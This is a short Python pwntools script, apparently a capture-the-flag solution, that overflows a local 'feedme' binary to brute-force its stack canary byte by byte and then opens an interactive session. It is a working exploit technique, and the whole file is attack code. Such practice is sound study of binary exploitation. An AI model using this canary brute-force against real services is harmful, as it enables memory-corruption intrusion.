from pwn import *


elf = context.binary = ELF("feedme")

p = process()
# gdb.attach(p)
# put = input()

canary = []
for i in range(4):
    print("                     ",i)
    for j in range(255):
        p.sendline(chr(33 + i).encode())
        p.send(flat(b"A" * 31 , canary + [chr(j)]))

        out = p.recvuntil(b"exit.")
        if b"YUM" in out:
            canary.append(chr(j))
            print("     COOL")
            print(hex(j))
            print(canary)
            break
        else:
            a = p.clean()
            print("     FAIELD",hex(j))

print(canary)
p.interactive()